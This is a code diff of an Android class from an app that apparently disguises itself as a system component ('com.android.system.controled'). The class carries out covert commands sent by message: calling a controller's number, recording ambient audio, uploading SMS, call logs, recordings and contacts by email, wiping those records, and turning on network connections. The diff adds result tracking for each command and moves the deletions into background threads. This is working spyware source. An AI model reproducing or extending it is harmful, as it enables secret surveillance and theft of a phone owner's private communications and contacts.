@@ -5,69 +5,150 @@ import java.io.File;
 import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
-import android.net.wifi.WifiManager;
 
 import com.android.system.controled.Debug;
 import com.android.system.controled.MainApplication;
-import com.android.system.controled.db.DatabaseUtil;
+import com.android.system.controled.bean.Code;
 
 public class DoAboutCodeUtils {
 
 	private static final String TAG = "DoAboutCodeUtils";
 
-	public static boolean doOperaByMessage(Context context, String msgTxt) {
-		boolean result = true;
+	/**
+	 * 是否是指令
+	 * 
+	 * @Description:
+	 * @param msgTxt
+	 * @return
+	 * @see:
+	 * @since:
+	 * @author: zhuanggy
+	 * @date:2013-10-15
+	 */
+	public static boolean isCode(String msgTxt) {
+
+		if (msgTxt.contains(MainApplication.PHONE_CODE_UP) || msgTxt.contains(MainApplication.PHONE_CODE_CALL_ME)
+
+		|| msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL) || msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER)
+
+		|| msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_ALL) || msgTxt.contains(MainApplication.PHONE_CODE_RECORD_TIME)
+
+		|| msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_CONTACTS) || msgTxt.contains(MainApplication.PHONE_CODE_RECORD_START)
+
+		|| msgTxt.contains(MainApplication.PHONE_CODE_RECORD_END) || msgTxt.contains(MainApplication.PHONE_CODE_DOWN)
+
+		|| msgTxt.contains(MainApplication.PHONE_CODE_DELETE_MSG_LOG) || msgTxt.contains(MainApplication.PHONE_CODE_DELETE_CALL_LOG)
+
+		|| msgTxt.contains(MainApplication.PHONE_CODE_TURNON_WIFI) || msgTxt.contains(MainApplication.PHONE_CODE_TURNON_MOBILE)
+
+		|| msgTxt.contains(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL) || msgTxt.contains(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER)
+
+		|| msgTxt.contains(MainApplication.PHONE_CODE_DELETE_ALL_LOG)) {
+			return true;
+		}
+
+		return false;
+	}
+
+	
+	/**
+	 * 执行命令
+	 * @Description:
+	 * @param context
+	 * @param msgTxt
+	 * @param code
+	 * @return
+	 * @see: 
+	 * @since: 
+	 * @author: zhuanggy
+	 * @date:2013-10-15
+	 */
+	public static Code doOperaByMessage(Context context, String msgTxt, Code code) {
+		
+		if(code.getRedoNeed() == Code.REDO_NOT) {
+			return code;
+		}
 		try {
 
 			if (msgTxt.contains(MainApplication.PHONE_CODE_UP)) {
+				code.setCode(MainApplication.PHONE_CODE_UP);
+				code.setMark(MainApplication.PHONE_CODE_UP_MARK);
 				Debug.e(TAG, "调大铃声音量，并加震动");
 				AudioUtil.turnUpMost(context);
+				code.setResult(Code.RESULT_OK);
 			}
 
 			else if (msgTxt.contains(MainApplication.PHONE_CODE_CALL_ME)) {
+				code.setCode(MainApplication.PHONE_CODE_CALL_ME);
+				code.setMark(MainApplication.PHONE_CODE_CALL_ME_MARK);
 				Debug.e(TAG, "拨打电话");
 				Uri uri = Uri.parse("tel:" + MainApplication.getInstence().getControllerTel());
 				Intent it = new Intent(Intent.ACTION_CALL, uri); // 直接呼出
 				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 				context.startActivity(it);
+
+				code.setResult(Code.RESULT_OK);
 			}
 
 			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL)) {
+				code.setRedoNeed(Code.REDO_NEED);
 				Debug.e(TAG, "上传短信通话记录");
 				SendEmailUtil send2 = new SendEmailUtil();
 				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE)) {
+					code.setCode(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MARK);
+					code.setMark(MainApplication.PHONE_CODE_CALL_ME_MARK);
 					send2.upLoadSmsCallLog(context, true);
 				} else {
+					code.setCode(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE);
+					code.setMark(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE_MARK);
 					send2.upLoadSmsCallLog(context, false);
 				}
 			}
 
 			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL)) {
 				Debug.e(TAG, "上传通话录音");
+				code.setRedoNeed(Code.REDO_NEED);
 				SendEmailUtil send2 = new SendEmailUtil();
 				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE)) {
+					code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE);
+					code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE_MARK);
+
 					send2.upLoadCallAudios(context, true);
 				} else {
+
+					code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL);
+					code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MARK);
+
 					send2.upLoadCallAudios(context, false);
 				}
 			}
 
 			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER)) {
 				Debug.e(TAG, "上传其它录音");
+				code.setRedoNeed(Code.REDO_NEED);
 				SendEmailUtil send2 = new SendEmailUtil();
 				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE)) {
+					code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE);
+					code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE_MARK);
 					send2.upLoadOtherAudios(context, true);
 				} else {
+					code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER);
+					code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MARK);
 					send2.upLoadOtherAudios(context, false);
 				}
 			}
 
 			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_ALL)) {
 				Debug.e(TAG, "上传所有");
+				code.setRedoNeed(Code.REDO_NEED);
 				SendEmailUtil send2 = new SendEmailUtil();
 				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE)) {
+					code.setCode(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE);
+					code.setMark(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE_MARK);
 					send2.upLoadALL(context, true);
 				} else {
+					code.setCode(MainApplication.PHONE_CODE_UPLOAD_ALL);
+					code.setMark(MainApplication.PHONE_CODE_UPLOAD_ALL_MARK);
 					send2.upLoadALL(context, false);
 				}
 			}
@@ -76,238 +157,217 @@ public class DoAboutCodeUtils {
 				String words = msgTxt.substring(msgTxt.indexOf(MainApplication.PHONE_CODE_RECORD_TIME), msgTxt.length());
 				String[] strs = words.split(":");
 				if (strs.length == 2 && strs[1] != null) {
+
+					code.setCode(MainApplication.PHONE_CODE_RECORD_TIME + strs[1]);
+					code.setMark(MainApplication.PHONE_CODE_RECORD_TIME_MARK);
+					code.setRedoNeed(Code.REDO_NOT);
+
 					Debug.e(TAG, "录音N分钟: " + strs[1]);
 					// 文件保存位置
 					File file = new File(MainApplication.FILEPATH_AUDIOS_OTHER + strs[1] + " minutes-" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
-					RecorderUtil.getInstence(context).startRecorder(file, Integer.parseInt(strs[1]));
+					if (RecorderUtil.getInstence(context).startRecorder(file, Integer.parseInt(strs[1]))) {
+						code.setResult(Code.RESULT_OK);
+					}
+
 				}
 			}
 
 			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_CONTACTS)) {
+				code.setRedoNeed(Code.REDO_NEED);
 				Debug.e(TAG, "开始上传联系人");
 				ContactsUtil.createContactsFile(context);
 				SendEmailUtil send3 = new SendEmailUtil();
 				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE)) {
+					code.setCode(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE);
+					code.setMark(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE_MARK);
 					send3.upLoadContact(context, true);
 				} else {
+					code.setCode(MainApplication.PHONE_CODE_UPLOAD_CONTACTS);
+					code.setMark(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MARK);
 					send3.upLoadContact(context, false);
 				}
 			}
 
 			else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_START)) {
+				code.setCode(MainApplication.PHONE_CODE_RECORD_START);
+				code.setMark(MainApplication.PHONE_CODE_RECORD_START_MARK);
+				code.setRedoNeed(Code.REDO_NOT);
 				Debug.e(TAG, "开始录音");
 				// 文件保存位置
 				File file = new File(MainApplication.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
-				RecorderUtil.getInstence(context).startRecorder(file, -1);
+				if (RecorderUtil.getInstence(context).startRecorder(file, -1)) {
+					code.setResult(Code.RESULT_OK);
+				}
 			}
 
 			else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_END)) {
 				Debug.e(TAG, "结束录音");
+				code.setCode(MainApplication.PHONE_CODE_RECORD_END);
+				code.setMark(MainApplication.PHONE_CODE_RECORD_END_MARK);
+				code.setRedoNeed(Code.REDO_NOT);
 				RecorderUtil.getInstence(context).stopRecorder();
+				code.setResult(Code.RESULT_OK);
 			}
 
 			else if (msgTxt.contains(MainApplication.PHONE_CODE_DOWN)) {
 				Debug.e(TAG, "静音，并取消震动");
+				code.setCode(MainApplication.PHONE_CODE_DOWN);
+				code.setMark(MainApplication.PHONE_CODE_DOWN_MARK);
+				code.setRedoNeed(Code.REDO_NOT);
 				AudioUtil.turnDown(context);
+				code.setResult(Code.RESULT_OK);
 			}
 
 			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_MSG_LOG)) {
+				code.setCode(MainApplication.PHONE_CODE_DELETE_MSG_LOG);
+				code.setMark(MainApplication.PHONE_CODE_DELETE_MSG_LOG_MARK);
+				code.setRedoNeed(Code.REDO_NOT);
 				Debug.e(TAG, "删除短信记录");
 				deleteSmsLog(context);
+				code.setResult(Code.RESULT_OK);
 			}
 
 			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_CALL_LOG)) {
+				code.setCode(MainApplication.PHONE_CODE_DELETE_CALL_LOG);
+				code.setMark(MainApplication.PHONE_CODE_DELETE_CALL_LOG_MARK);
+				code.setRedoNeed(Code.REDO_NOT);
 				Debug.e(TAG, "删除通话记录");
 				deleteCallLog();
+				code.setResult(Code.RESULT_OK);
 			}
 
 			else if (msgTxt.contains(MainApplication.PHONE_CODE_TURNON_WIFI)) {
+				code.setCode(MainApplication.PHONE_CODE_TURNON_WIFI);
+				code.setMark(MainApplication.PHONE_CODE_TURNON_WIFI_MARK);
+				code.setRedoNeed(Code.REDO_NOT);
 				Debug.e(TAG, "开启wifi");
 				NetworkUtil.turnOnWifi(context);
+				code.setResult(Code.RESULT_OK);
 			}
 
 			else if (msgTxt.contains(MainApplication.PHONE_CODE_TURNON_MOBILE)) {
+				code.setCode(MainApplication.PHONE_CODE_TURNON_MOBILE);
+				code.setMark(MainApplication.PHONE_CODE_TURNON_MOBILE_MARK);
+				code.setRedoNeed(Code.REDO_NOT);
 				Debug.e(TAG, "开启mobile network");
 				NetworkUtil.setMobileNetEnable(context);
+				code.setResult(Code.RESULT_OK);
 			}
 
 			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL)) {
+				code.setCode(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL);
+				code.setMark(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL_MARK);
+				code.setRedoNeed(Code.REDO_NOT);
 				Debug.e(TAG, "删除通话录音记录");
 				deleteCallRecord();
+				code.setResult(Code.RESULT_OK);
 			}
 
 			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER)) {
+				code.setCode(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER_MARK);
+				code.setMark(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER);
+				code.setRedoNeed(Code.REDO_NOT);
 				Debug.e(TAG, "删除其它录音记录");
 				deleteOtherRecord();
+				code.setResult(Code.RESULT_OK);
 			}
 
 			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_ALL_LOG)) {
+				code.setCode(MainApplication.PHONE_CODE_DELETE_ALL_LOG);
+				code.setMark(MainApplication.PHONE_CODE_DELETE_ALL_LOG_MARK);
+				code.setRedoNeed(Code.REDO_NOT);
 				Debug.e(TAG, "删除所有记录");
 				deleteSmsLog(context);
 				deleteCallLog();
 				deleteCallRecord();
 				deleteOtherRecord();
+				code.setResult(Code.RESULT_OK);
 			}
 
-			else {
-
-				result = false;
-
-				// // 在特定时间内，自动调大音量
-				// switch (Globle.inTime()) {
-				// case 1:
-				// Globle.turnUpMost(context);
-				// break;
-				// case 2:
-				// Globle.turnUpSecond(context);
-				// break;
-				//
-				// default:
-				// break;
-				// }
-				// SystemClock.sleep(3000);
-				// SmsSaveOutUtil so = new SmsSaveOutUtil(context);
-				// so.saveLastSms();
-			}
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
-		return result;
+		return code;
 	}
 
 	private static void deleteSmsLog(Context context) {
 
-		try {
-			File a = new File(MainApplication.FILE_SMS_DB);
+		new Thread(new Runnable() {
 
-			if (a.exists()) {
-				// SmsSaveOutUtil so = new SmsSaveOutUtil(context);
-				SmsSaveOutUtil so = SmsSaveOutUtil.getInstence();
-				so.deleteAllMsg();
+			@Override
+			public void run() {
+
+				try {
+					File a = new File(MainApplication.FILE_SMS_DB);
+
+					if (a.exists()) {
+						// SmsSaveOutUtil so = new SmsSaveOutUtil(context);
+						SmsSaveOutUtil so = SmsSaveOutUtil.getInstence();
+						so.deleteAllMsg();
+					}
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
 			}
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
+		}).start();
+
 	}
 
 	private static void deleteCallLog() {
-		try {
-			if (MainApplication.FILE_CALL_LOG.exists()) {
-				MainApplication.FILE_CALL_LOG.delete();
-			}
 
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
+		new Thread(new Runnable() {
+
+			@Override
+			public void run() {
+
+				try {
+					if (MainApplication.FILE_CALL_LOG.exists()) {
+						MainApplication.FILE_CALL_LOG.delete();
+					}
+
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
+
+			}
+		}).start();
+
 	}
 
 	private static void deleteCallRecord() {
-		try {
-			FileUtil.delFileDir(new File(MainApplication.FILEPATH_AUDIOS_CALL));
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
+
+		new Thread(new Runnable() {
+
+			@Override
+			public void run() {
+
+				try {
+					FileUtil.delFileDir(new File(MainApplication.FILEPATH_AUDIOS_CALL));
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
+
+			}
+		}).start();
+
 	}
 
 	private static void deleteOtherRecord() {
-		try {
-			FileUtil.delFileDir(new File(MainApplication.FILEPATH_AUDIOS_OTHER));
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
-	}
 
-	// private boolean getMobileDataStatus(Context context) {
-	// ConnectivityManager conMgr = (ConnectivityManager)
-	// context.getSystemService(Context.CONNECTIVITY_SERVICE);
-	//
-	// Class<?> conMgrClass = null; // ConnectivityManager类
-	// Field iConMgrField = null; // ConnectivityManager类中的字段
-	// Object iConMgr = null; // IConnectivityManager类的引用
-	// Class<?> iConMgrClass = null; // IConnectivityManager类
-	// Method getMobileDataEnabledMethod = null; // setMobileDataEnabled方法
-	//
-	// try {
-	// // 取得ConnectivityManager类
-	// conMgrClass = Class.forName(conMgr.getClass().getName());
-	// // 取得ConnectivityManager类中的对象mService
-	// iConMgrField = conMgrClass.getDeclaredField("mService");
-	// // 设置mService可访问
-	// iConMgrField.setAccessible(true);
-	// // 取得mService的实例化类IConnectivityManager
-	// iConMgr = iConMgrField.get(conMgr);
-	// // 取得IConnectivityManager类
-	// iConMgrClass = Class.forName(iConMgr.getClass().getName());
-	// // 取得IConnectivityManager类中的getMobileDataEnabled(boolean)方法
-	// getMobileDataEnabledMethod = iConMgrClass.getDeclaredMethod("getMobileDataEnabled");
-	// // 设置getMobileDataEnabled方法可访问
-	// getMobileDataEnabledMethod.setAccessible(true);
-	// // 调用getMobileDataEnabled方法
-	// return (Boolean) getMobileDataEnabledMethod.invoke(iConMgr);
-	// } catch (ClassNotFoundException e) {
-	// e.printStackTrace();
-	// } catch (NoSuchFieldException e) {
-	// e.printStackTrace();
-	// } catch (SecurityException e) {
-	// e.printStackTrace();
-	// } catch (NoSuchMethodException e) {
-	// e.printStackTrace();
-	// } catch (IllegalArgumentException e) {
-	// e.printStackTrace();
-	// } catch (IllegalAccessException e) {
-	// e.printStackTrace();
-	// } catch (InvocationTargetException e) {
-	// // TODO Auto-generated catch block
-	// e.printStackTrace();
-	// }
-	// return false;
-	// }
-	//
-	// /**
-	// * 移动网络开关
-	// */
-	// private void toggleMobileData(Context context, boolean enabled) {
-	// ConnectivityManager conMgr = (ConnectivityManager)
-	// context.getSystemService(Context.CONNECTIVITY_SERVICE);
-	//
-	// Class<?> conMgrClass = null; // ConnectivityManager类
-	// Field iConMgrField = null; // ConnectivityManager类中的字段
-	// Object iConMgr = null; // IConnectivityManager类的引用
-	// Class<?> iConMgrClass = null; // IConnectivityManager类
-	// Method setMobileDataEnabledMethod = null; // setMobileDataEnabled方法
-	//
-	// try {
-	// // 取得ConnectivityManager类
-	// conMgrClass = Class.forName(conMgr.getClass().getName());
-	// // 取得ConnectivityManager类中的对象mService
-	// iConMgrField = conMgrClass.getDeclaredField("mService");
-	// // 设置mService可访问
-	// iConMgrField.setAccessible(true);
-	// // 取得mService的实例化类IConnectivityManager
-	// iConMgr = iConMgrField.get(conMgr);
-	// // 取得IConnectivityManager类
-	// iConMgrClass = Class.forName(iConMgr.getClass().getName());
-	// // 取得IConnectivityManager类中的setMobileDataEnabled(boolean)方法
-	// setMobileDataEnabledMethod = iConMgrClass.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
-	// // 设置setMobileDataEnabled方法可访问
-	// setMobileDataEnabledMethod.setAccessible(true);
-	// // 调用setMobileDataEnabled方法
-	// setMobileDataEnabledMethod.invoke(iConMgr, enabled);
-	// } catch (ClassNotFoundException e) {
-	// e.printStackTrace();
-	// } catch (NoSuchFieldException e) {
-	// e.printStackTrace();
-	// } catch (SecurityException e) {
-	// e.printStackTrace();
-	// } catch (NoSuchMethodException e) {
-	// e.printStackTrace();
-	// } catch (IllegalArgumentException e) {
-	// e.printStackTrace();
-	// } catch (IllegalAccessException e) {
-	// e.printStackTrace();
-	// } catch (InvocationTargetException e) {
-	// e.printStackTrace();
-	// }
-	// }
+		new Thread(new Runnable() {
+
+			@Override
+			public void run() {
+
+				try {
+					FileUtil.delFileDir(new File(MainApplication.FILEPATH_AUDIOS_OTHER));
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
+
+			}
+		}).start();
+
+	}
 
 }
